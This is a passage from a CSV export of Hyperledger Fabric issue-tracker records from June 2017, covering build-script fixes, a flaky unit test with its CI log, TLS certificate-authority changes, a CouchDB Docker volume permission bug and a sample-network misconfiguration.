* rewrite peer/node/start.go in a way that does not depend on syscalls - the syscalls is just used to get a file lock so peer startup can write a pid.... overkill to get a lock on the file if you ask me. Call the file peer.<pid> and write the PID
* not to build peer on windows
* revert https://gerrit.hyperledger.org/r/#/c/10583 so peer is not available as a prebuilt binary on any platform

 [~binhn]  [~ChristopherFerris] [~greg.haskins] [~mastersingh24] what do you think ?;;;","22/Jun/17 3:28 AM;muralisr;rewriting that piece of code to remove the offending syscalls. Will post a CR shortly so we can take a look and weigh pros/cons.;;;","22/Jun/17 3:50 AM;muralisr;https://gerrit.hyperledger.org/r/#/c/10943;;;","23/Jun/17 6:44 AM;rameshthoomu;Patch has been submitted and merged. Now able to build binaries using `make dist-all` and make release-all`.. Closing this now;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
update curl command in bootstrap-1.0.0-rc1.sh according to the make dist-all changes,FAB-4900,18504,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,rameshthoomu,rameshthoomu,rameshthoomu,21/Jun/17 1:42 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,22/Jun/17 3:08 AM,v1.0.0,,,v1.0.0-rc1,,fabric-build,,,,,,0,build-system,,,,,,"update bootstrap script according to the make dist-all changes. make dist-all generates

hyperledger-fabric-linux-amd64.1.0.0-rc1.tar.gz

hyperledger-fabric-linux-ppc64le.1.0.0-rc1.tar.gz

hyperledger-fabric-linux-s390x.1.0.0-rc1.tar.gz

hyperledger-fabric-darwin-amd64.1.0.0-rc1.tar.gz

hyperledger-fabric-windows-amd64.1.0.0-rc1.tar.gz

but the curl command in the bootstrap-1.0.0-rc1.sh script is referring incorrect format..",,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,FAB-4518,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy553:",,,,,,,,,,,,,,,,,,,,,,,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"22/Jun/17 3:08 AM;rameshthoomu;patch has been submitted and merged. marking as done.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Harden delivery client service unavailable test,FAB-4901,18505,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,C0rWin,C0rWin,C0rWin,21/Jun/17 4:58 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,28/Jun/17 9:29 PM,v1.0.0-alpha2,,,v1.0.0,,fabric-gossip,,,,,,0,gossip,,,,,,"There are couple of intermittent failure of the {{TestDeliverServiceServiceUnavailable}} test discovered lately in CI, here one of the console output evidences: https://jenkins.hyperledger.org/job/fabric-verify-x86_64/13672/console

The stack trace is:

{code}
00:35:58 unit-tests_1  | 2017-06-21 00:35:17.741 UTC [msp] getMspConfig -> INFO 001 intermediate certs folder not found at [/opt/gopath/src/github.com/hyperledger/fabric/sampleconfig/msp/intermediatecerts]. Skipping.: [stat /opt/gopath/src/github.com/hyperledger/fabric/sampleconfig/msp/intermediatecerts: no such file or directory]
00:35:58 unit-tests_1  | 2017-06-21 00:35:17.742 UTC [msp] getMspConfig -> INFO 002 crls folder not found at [/opt/gopath/src/github.com/hyperledger/fabric/sampleconfig/msp/intermediatecerts]. Skipping.: [stat /opt/gopath/src/github.com/hyperledger/fabric/sampleconfig/msp/crls: no such file or directory]
00:35:58 unit-tests_1  | 2017-06-21 00:35:17.809 UTC [deliveryClient] connect -> ERRO 003 Failed obtaining connection: Failed connecting
00:35:58 unit-tests_1  | 2017-06-21 00:35:17.809 UTC [deliveryClient] connect -> ERRO 004 Failed obtaining connection: Failed connecting
00:35:58 unit-tests_1  | 2017-06-21 00:35:17.810 UTC [deliveryClient] connect -> ERRO 005 Connection to  localhost:5611 established but was unable to create gRPC stream: Failed creating ABC
00:35:58 unit-tests_1  | 2017-06-21 00:35:17.811 UTC [deliveryClient] connect -> ERRO 006 Connection to  localhost:5611 established but was unable to create gRPC stream: Failed creating ABC
00:35:58 unit-tests_1  | 2017-06-21 00:35:17.812 UTC [deliveryClient] afterConnect -> ERRO 007 Failed setting up broadcast: Setup failed
00:35:58 unit-tests_1  | 2017-06-21 00:35:17.812 UTC [deliveryClient] afterConnect -> ERRO 008 Failed setting up broadcast: Setup failed
00:35:58 unit-tests_1  | 2017-06-21 00:35:17.814 UTC [deliveryClient] connect -> ERRO 009 Failed obtaining connection: Failed connecting
00:35:58 unit-tests_1  | 2017-06-21 00:35:17.814 UTC [deliveryClient] connect -> ERRO 00a Failed obtaining connection: Failed connecting
00:35:58 unit-tests_1  | 2017-06-21 00:35:17.815 UTC [deliveryClient] connect -> ERRO 00b Failed obtaining connection: Failed connecting
00:35:58 unit-tests_1  | 2017-06-21 00:35:17.815 UTC [deliveryClient] connect -> ERRO 00c Failed obtaining connection: Failed connecting
00:35:58 unit-tests_1  | 2017-06-21 00:35:17.815 UTC [deliveryClient] connect -> ERRO 00d Failed obtaining connection: Failed connecting
00:35:58 unit-tests_1  | 2017-06-21 00:35:17.815 UTC [deliveryClient] connect -> ERRO 00e Failed obtaining connection: Failed connecting
00:35:58 unit-tests_1  | 2017-06-21 00:35:17.815 UTC [deliveryClient] connect -> ERRO 00f Failed obtaining connection: Failed connecting
00:35:58 unit-tests_1  | 2017-06-21 00:35:17.815 UTC [deliveryClient] connect -> ERRO 010 Failed obtaining connection: Failed connecting
00:35:58 unit-tests_1  | 2017-06-21 00:35:17.815 UTC [deliveryClient] connect -> ERRO 011 Failed obtaining connection: Failed connecting
00:35:58 unit-tests_1  | 2017-06-21 00:35:17.816 UTC [deliveryClient] connect -> ERRO 012 Failed obtaining connection: Failed connecting
00:35:58 unit-tests_1  | 2017-06-21 00:35:17.816 UTC [deliveryClient] connect -> ERRO 013 Failed obtaining connection: Failed connecting
00:35:58 unit-tests_1  | 2017-06-21 00:35:17.816 UTC [deliveryClient] connect -> ERRO 014 Failed obtaining connection: Failed connecting
00:35:58 unit-tests_1  | 2017-06-21 00:35:17.816 UTC [deliveryClient] connect -> ERRO 015 Failed obtaining connection: Failed connecting
00:35:58 unit-tests_1  | 2017-06-21 00:35:17.816 UTC [deliveryClient] connect -> ERRO 016 Failed obtaining connection: Failed connecting
00:35:58 unit-tests_1  | 2017-06-21 00:35:17.816 UTC [deliveryClient] connect -> ERRO 017 Failed obtaining connection: Failed connecting
00:35:58 unit-tests_1  | 2017-06-21 00:35:17.816 UTC [deliveryClient] connect -> ERRO 018 Failed obtaining connection: Failed connecting
00:35:58 unit-tests_1  | 2017-06-21 00:35:17.817 UTC [deliveryClient] connect -> ERRO 019 Failed obtaining connection: Failed connecting
00:35:58 unit-tests_1  | 2017-06-21 00:35:17.817 UTC [deliveryClient] connect -> ERRO 01a Failed obtaining connection: Failed connecting
00:35:58 unit-tests_1  | 2017-06-21 00:35:17.817 UTC [deliveryClient] connect -> ERRO 01b Failed obtaining connection: Failed connecting
00:35:58 unit-tests_1  | 2017-06-21 00:35:17.817 UTC [deliveryClient] connect -> ERRO 01c Failed obtaining connection: Failed connecting
00:35:58 unit-tests_1  | 2017-06-21 00:35:17.817 UTC [deliveryClient] connect -> ERRO 01d Failed obtaining connection: Failed connecting
00:35:58 unit-tests_1  | 2017-06-21 00:35:17.817 UTC [deliveryClient] connect -> ERRO 01e Failed obtaining connection: Failed connecting
00:35:58 unit-tests_1  | 2017-06-21 00:35:17.817 UTC [deliveryClient] connect -> ERRO 01f Failed obtaining connection: Failed connecting
00:35:58 unit-tests_1  | 2017-06-21 00:35:17.817 UTC [deliveryClient] connect -> ERRO 020 Failed obtaining connection: Failed connecting
00:35:58 unit-tests_1  | 2017-06-21 00:35:17.818 UTC [deliveryClient] connect -> ERRO 021 Failed obtaining connection: Failed connecting
00:35:58 unit-tests_1  | 2017-06-21 00:35:17.818 UTC [deliveryClient] connect -> ERRO 022 Failed obtaining connection: Failed connecting
00:35:58 unit-tests_1  | 2017-06-21 00:35:17.818 UTC [deliveryClient] connect -> ERRO 023 Failed obtaining connection: Failed connecting
00:35:58 unit-tests_1  | 2017-06-21 00:35:17.818 UTC [deliveryClient] connect -> ERRO 024 Failed obtaining connection: Failed connecting
00:35:58 unit-tests_1  | 2017-06-21 00:35:17.818 UTC [deliveryClient] connect -> ERRO 025 Failed obtaining connection: Failed connecting
00:35:58 unit-tests_1  | 2017-06-21 00:35:17.818 UTC [deliveryClient] connect -> ERRO 026 Failed obtaining connection: Failed connecting
00:35:58 unit-tests_1  | 2017-06-21 00:35:17.818 UTC [deliveryClient] connect -> ERRO 027 Failed obtaining connection: Failed connecting
00:35:58 unit-tests_1  | 2017-06-21 00:35:17.818 UTC [deliveryClient] connect -> ERRO 028 Failed obtaining connection: Failed connecting
00:35:58 unit-tests_1  | 2017-06-21 00:35:17.819 UTC [deliveryClient] connect -> ERRO 029 Failed obtaining connection: Failed connecting
00:35:58 unit-tests_1  | 2017-06-21 00:35:17.826 UTC [deliveryClient] connect -> ERRO 02a Failed obtaining connection: Failed connecting
00:35:58 unit-tests_1  | 2017-06-21 00:35:17.826 UTC [deliveryClient] connect -> ERRO 02b Failed obtaining connection: Failed connecting
00:35:58 unit-tests_1  | 2017-06-21 00:35:17.826 UTC [deliveryClient] connect -> ERRO 02c Failed obtaining connection: Failed connecting
00:35:58 unit-tests_1  | 2017-06-21 00:35:17.826 UTC [deliveryClient] connect -> ERRO 02d Failed obtaining connection: Failed connecting
00:35:58 unit-tests_1  | 2017-06-21 00:35:17.826 UTC [deliveryClient] connect -> ERRO 02e Failed obtaining connection: Failed connecting
00:35:58 unit-tests_1  | 2017-06-21 00:35:19.327 UTC [deliveryClient] connect -> ERRO 02f Failed obtaining connection: Failed connecting
00:35:58 unit-tests_1  | 2017-06-21 00:35:20.827 UTC [deliveryClient] connect -> ERRO 030 Failed obtaining connection: Failed connecting
00:35:58 unit-tests_1  | 2017-06-21 00:35:22.830 UTC [deliveryClient] connect -> ERRO 031 Connection to  localhost:5611 established but was unable to create gRPC stream: Failed creating ABC
00:35:58 unit-tests_1  | 2017-06-21 00:35:23.831 UTC [deliveryClient] connect -> ERRO 032 Connection to  localhost:5611 established but was unable to create gRPC stream: Failed creating ABC
00:35:58 unit-tests_1  | 2017-06-21 00:35:26.936 UTC [deliveryClient] StartDeliverForChannel -> ERRO 033 Delivery service - block provider already exists for TEST_CHAINID found, can't start delivery
00:35:58 unit-tests_1  | 2017-06-21 00:35:26.936 UTC [deliveryClient] StopDeliverForChannel -> ERRO 034 Delivery service - no block provider for TEST_CHAINID2 found, can't stop delivery
00:35:58 unit-tests_1  | 2017-06-21 00:35:28.447 UTC [deliveryClient] StartDeliverForChannel -> ERRO 035 Delivery service is stopping cannot join a new channel TEST_CHAINID
00:35:58 unit-tests_1  | 2017-06-21 00:35:28.447 UTC [deliveryClient] StopDeliverForChannel -> ERRO 036 Delivery service is stopping, cannot stop delivery for channel TEST_CHAINID
00:35:58 unit-tests_1  | 2017-06-21 00:35:33.433 UTC [blocksProvider] DeliverBlocks -> WARN 037 [TEST_CHAINID] Receive error: Client is closing
00:35:58 unit-tests_1  | 2017-06-21 00:35:38.937 UTC [ConnProducer] NewConnection -> ERRO 038 Failed connecting to localhost:5612 , error: context deadline exceeded
00:35:58 unit-tests_1  | 2017-06-21 00:35:40.942 UTC [blocksProvider] DeliverBlocks -> WARN 039 [TEST_CHAINID] Receive error: Client is closing
00:35:58 unit-tests_1  | 2017-06-21 00:35:47.444 UTC [blocksProvider] DeliverBlocks -> WARN 03a [TEST_CHAINID] Got error &{SERVICE_UNAVAILABLE}
00:35:58 unit-tests_1  | 2017-06-21 00:35:47.546 UTC [blocksProvider] DeliverBlocks -> WARN 03b [TEST_CHAINID] Got error &{SERVICE_UNAVAILABLE}
00:35:58 unit-tests_1  | 2017-06-21 00:35:47.750 UTC [blocksProvider] DeliverBlocks -> WARN 03c [TEST_CHAINID] Got error &{SERVICE_UNAVAILABLE}
00:35:58 unit-tests_1  | 2017-06-21 00:35:48.152 UTC [blocksProvider] DeliverBlocks -> WARN 03d [TEST_CHAINID] Got error &{SERVICE_UNAVAILABLE}
00:35:58 unit-tests_1  | 2017-06-21 00:35:48.954 UTC [blocksProvider] DeliverBlocks -> WARN 03e [TEST_CHAINID] Got error &{SERVICE_UNAVAILABLE}
00:35:58 unit-tests_1  | 2017-06-21 00:35:50.556 UTC [blocksProvider] DeliverBlocks -> WARN 03f [TEST_CHAINID] Got error &{SERVICE_UNAVAILABLE}
00:35:58 unit-tests_1  | --- FAIL: TestDeliverServiceServiceUnavailable (12.50s)
00:35:58 unit-tests_1  | 	assertions.go:225: 
                        
	Error Trace:	deliveryclient_test.go:429
00:35:58 unit-tests_1  | 		
			deliveryclient_test.go:304
00:35:58 unit-tests_1  | 		
	Error:		Didn't gossip a new block within a timely manner
00:35:58 unit-tests_1  | 		
00:35:58 unit-tests_1  | 2017-06-21 00:35:54.952 UTC [blocksProvider] DeliverBlocks -> WARN 040 [TEST_CHAINID] Receive error: Client is closing
00:35:58 unit-tests_1  | FAIL
00:35:58 unit-tests_1  | coverage: 91.8% of statements
00:35:58 unit-tests_1  | FAIL	github.com/hyperledger/fabric/core/deliverservice	40.758s
00:35:58 unit-tests_1  | error: exit status 1
00:35:58 unit-tests_1  | panic: EOF
00:35:58 unit-tests_1  | 
00:35:58 unit-tests_1  | goroutine 1 [running]:
00:35:58 unit-tests_1  | panic(0x4daca0, 0xc42006a020)
00:35:58 unit-tests_1  | 	/opt/go/src/runtime/panic.go:500 +0x1a1
00:35:58 unit-tests_1  | main.main()
00:35:58 unit-tests_1  | 	/opt/gotools/obj/gopath/src/github.com/AlekSi/gocov-xml/gocov-xml.go:60 +0x15fd
00:35:58 unittest_unit-tests_1 exited with code 2
00:35:58 Stopping couchdb ... 
00:35:58 Stopping unittest_vp_1 ... 
00:35:59 
Stopping unittest_vp_1 ... done

Stopping couchdb ... done
{code}",,C0rWin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-290,,,,,,,,,"1|hzy55b:",,,,,,,,,,,,,,,,,,,,,,,C0rWin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"21/Jun/17 5:02 PM;C0rWin;https://gerrit.hyperledger.org/r/#/c/10897/;;;","22/Jun/17 3:35 AM;C0rWin;Lowering severity to medium since related to UT failures only.;;;","27/Jun/17 7:28 AM;C0rWin;Re-opening due to: https://jenkins.hyperledger.org/job/fabric-verify-x86_64/13810/console  ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Config ""peer.gomaxprocs"" is not reflected in some unit tests.",FAB-4902,18507,,Bug,Closed,FAB,Fabric,software,denyeart,,,Low,Done,K.Fukuch,K.Fukuch,K.Fukuch,21/Jun/17 5:13 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,26/Jun/17 6:49 PM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"The following tests (or test library) read the config, but apply a fixed value or don't apply it.

core/testutil/config.go
{code:java}
// Set the number of maxprocs
var numProcsDesired = viper.GetInt(""peer.gomaxprocs"")
configLogger.Debugf(""setting Number of procs to %d, was %d\n"", numProcsDesired, runtime.GOMAXPROCS(2)) # <-- runtime.GOMAXPROCS should be called with 'numProcsDesired' rather than '2'
{code}
 

core/chaincode/exectransaction_test.go

 
{code:java}
// Set the number of maxprocs
var numProcsDesired = viper.GetInt(""peer.gomaxprocs"")
chaincodeLogger.Debugf(""setting Number of procs to %d, was %d\n"", numProcsDesired, runtime.GOMAXPROCS(2)) # <-- runtime.GOMAXPROCS should be called with 'numProcsDesired' rather than '2'{code}
 


core/endorser/endorser_test.go
{code:java}
// Set the number of maxprocs
viper.GetInt(""peer.gomaxprocs"") # <-- only reads the config{code}
 ",,K.Fukuch,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy55r:",,,,,,,,,,,,,,,,,,,,,,,K.Fukuch,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Modify cryptogen to use separate CA for TLS certs,FAB-4903,18510,17897,Sub-task,Closed,FAB,Fabric,software,denyeart,,,High,Done,mastersingh24,mastersingh24,mastersingh24,21/Jun/17 6:13 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,22/Jun/17 6:50 AM,v1.0.0-beta,,,v1.0.0,v1.0.0-rc1,fabric-tools,,,,,,0,Security,,,,,,"Need to do 3 things:

1) Add new folders to the MSP structure for TLS root and intermediate roots

2) Use a separate CA per org to generate TLS certificates

3) Place TLS material in proper folders",,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,";22/Jun/17 12:38 AM;mastersingh24;9000",,7200,0,9000,125%,7200,0,9000,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy56f:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"22/Jun/17 12:38 AM;mastersingh24;https://gerrit.hyperledger.org/r/#/c/10915/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Modify peer to trust TLS roots and intermediates,FAB-4904,18511,17897,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,mastersingh24,mastersingh24,21/Jun/17 6:17 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,23/Jun/17 6:19 AM,v1.0.0-beta,,,v1.0.0,v1.0.0-rc1,fabric-peer,,,,,,0,Security,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,";22/Jun/17 6:26 PM;mastersingh24;3600",,7200,3600,3600,50%,7200,3600,3600,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,FAB-4750,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy56n:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,mergify/bp/release-2.2/pr-4374,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,main,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,mergify/bp/release-2.2/pr-3750,dev,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,release-2.5,release-2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"23/Jun/17 3:49 AM;mastersingh24;https://gerrit.hyperledger.org/r/11021;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fabric 1.0.0-beta CouchDB docker container image can't be loaded with host mounted volume.,FAB-4905,18512,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,thirdstage,thirdstage,21/Jun/17 6:18 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,30/Sep/17 6:35 PM,v1.0.0-alpha2,v1.0.0-beta,,DUPLICATE,,fabric-ledger,,,,,,0,couchdb,,,,,,"h3. +Problem+

The dockerfile for Fabric CouchDB in 1.0.0-beta ([https://github.com/hyperledger/fabric/blob/v1.0.0-beta/images/couchdb/Dockerfile.in)] has degradation which can cause the container can't be loaded successfully with host directory volume mapping.

Although the following Docker run command would load the container successfully,
{quote}docker run -itd \
--name couch1 \
-p 5984:5984 \
hyperledger/fabric-couchdb:x86_64-1.0.0-beta
{quote}
The next command which has host mounted volume( {{-v ~/docker/opt/couchdb/couch1/data:/opt/couchdb/data}} ) would fail.
{quote}docker run -itd \
--name couch1 \
-p 5984:5984 \
-v ~/docker/opt/couchdb/couch1/data:/opt/couchdb/data \
hyperledger/fabric-couchdb:x86_64-1.0.0-beta
{quote}
With host mounted volume, you can find the following error message via docker logs
{quote}[os_mon] cpu supervisor port (cpu_sup): Error writing to Erlang
{quote}
 
h3. +Cause+

This is because the {{/opt/couchdb/data}} directory is set to owned by {{root}} user and {{root}} group when created on host mounted volume.

Although the dockerfile ([https://github.com/hyperledger/fabric/blob/v1.0.0-beta/images/couchdb/Dockerfile.in)] contains {{chown -R couchdb:couchdb /opt/couchdb/}} commands before {{VOLUME}} instruction, the {{chown}} command has no effect when the volume is created as an host mounted volume.

From 1.0.0-alpha2, the Fabric CouchDB dockerfile changes the current user to {{couchdb}} ( {{USER couchdb}} instruction in dockerfile) before starting the CouchDB. So the data directory ({{/opt/couchdb/data}} )  on host mounted volume whose owner is set to {{root:root}} is can't be accessed CouchDB instance.
h3. +Recommended Solution+

1.0.0-alpha has no problem with host mounted volume on {{/opt/couchdb/data}} where the container is executed as a {{root}} until the entry-point and the entry-point  ({{/docker-entrypoint.sh}} : [https://github.com/hyperledger/fabric/blob/v1.0.0-alpha/images/couchdb/docker-entrypoint.sh)] contains the command to change the owner of {{/opt/couchdb/data}} directory to {{couchdb}} ( {{chown -R couchdb:couchdb /opt/couchdb}} ) before launch the CouchDB.

So, I think it would be better to restore the {{Dockerfile.in}} and {{docker-entrypoint.sh}} file of 1.0.0-alpha. 

 

 

 ",,denyeart,mastersingh24,thirdstage,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5700,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy56v:",,,,,,,,,,,,,,,,,,,,,,,denyeart,mastersingh24,thirdstage,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"24/Aug/17 10:48 PM;denyeart;[~mastersingh24] I believe this is the same issue you mentioned to me.  Could you comment on the Recommended Solution?

[~AdnanChoudhury] Could you take a look?;;;","30/Sep/17 7:23 AM;mastersingh24;I'm going to check in the fix.  Sorry for the delay.  Slipped past me;;;","30/Sep/17 6:35 PM;mastersingh24;Fixed under https://jira.hyperledger.org/browse/FAB-5700;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
generateArtifacts.sh replacePrivateKey does not work,FAB-4906,18513,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,nnao,bh4rtp,bh4rtp,21/Jun/17 7:27 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,07/Jul/17 11:09 AM,v1.0.0-beta,,,v1.0.0,,fabric-samples,,,,,,0,,,,,,,"fabric/examples/e2e_cli/generateArtifacts.sh replacePrivateKey does not work due to sed error:

sed: -e expression #1, char 85: unterminated `s' command

Platform: Ubuntu 16.04

# source generateArtifacts.sh ech1",,bh4rtp,nnao,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy573:",,,,,,,,,,,,,,,,,,,,,,,bh4rtp,nnao,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"29/Jun/17 7:19 AM;nnao;https://gerrit.hyperledger.org/r/#/c/11239/;;;","10/Jul/17 4:04 PM;bh4rtp;not really solved.
i think it should use -d but not -f to check whether the crypto-config directory existed or not, i.e.
        if [ -d ""./crypto-config"" ]; then
                echo ""crypto-config directory already exists.""
        else
        #Generate all the artifacts that includes org certs, orderer genesis block,
        # channel configuration transaction
                source generateArtifacts.sh $CH_NAME
        fi
;;;","13/Jul/17 8:17 AM;nnao;[~bh4rtp] Thank you for comment. I will fix that.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
instantiate is not working while executing byfn.sh(build your first network script),FAB-4908,18516,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,rameshthoomu,rameshthoomu,rameshthoomu,21/Jun/17 11:01 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,23/Jun/17 10:29 PM,v1.0.0,,,v1.0.0-rc1,,fabric-build,,,,,,0,quality,,,,,,"While executing *byfn.sh* from fabric-samples repository, observed instantiate is not working. Below is the possible reason

[https://github.com/hyperledger/fabric-samples/blob/master/first-network/base/peer-base.yaml#L15]

1) clone fabric-samples repository

2) cd first-network

3) ./byfn -m generate

4) ./byfn -m up

Expected result: e2e tests should work as expected

Actual Result: Instantiate is failing with the below error

Error: Error endorsing chaincode: rpc error: code = Unknown desc = Error starting container: API error (404): \{""message"":""network byfn_default not found""}",Vagrant,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,FAB-4909,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzx2an:",,,,,,,,,,,,,,,,,,,,,,,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
first-network peer-base.yaml had incorrect network,FAB-4909,18517,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,ChristopherFerris,ChristopherFerris,ChristopherFerris,22/Jun/17 12:01 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,23/Jun/17 11:52 PM,v1.0.0-beta,,,v1.0.0-rc1,,fabric-samples,,,,,,0,,,,,,,see chat here https://chat.hyperledger.org/channel/fabric-release?msg=wMsLZTg6XB4Es42iW,,ChristopherFerris,mastersingh24,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,3600,3600,,0%,3600,3600,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,FAB-4908,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy57j:",,,,,,,,,,,,,,,,,,,,,,,ChristopherFerris,mastersingh24,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jun/17 6:46 AM;rameshthoomu;fix has been submitted. https://gerrit.hyperledger.org/r/#/c/10913/;;;","23/Jun/17 10:25 PM;mastersingh24;Everything works for me - who is going to close this? [~ChristopherFerris] [~rameshthoomu] ?

Need to close FAB-4908 as well;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Release notes for what's contained in [v1.0.0-rc] release,FAB-4910,18519,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,JonathanLevi,JonathanLevi,JonathanLevi,22/Jun/17 1:44 AM,30/Jul/19 11:59 AM,28/Oct/23 3:00 AM,30/Jul/19 11:59 AM,v1.0.0-beta,,,,,fabric-docs,,,,,,0,Documentation,,,,,,"We should probably have a more ""generic"" and reusable JIRA ticket for this (maybe an Epic with a few tasks, one per release or so), but just quickly:

For people who would like to add notes to the release, we can either have them appended here, or in a Google doc. Whatever people find more convenient. Chris and I will try to combine them, and add ours (e.g., some last minute errata ;),.).. but let's first have all the data/info captured.

For context, we are ""pre-pending"" these here: [https://github.com/hyperledger/fabric/blob/master/docs/source/releases.rst]

A shared Google Doc for those who prefer that: https://docs.google.com/document/d/1zRtJGPDnvqx54Ead6jBSTc86C4IPIwi-_qQT0UOzre4/edit?usp=sharing

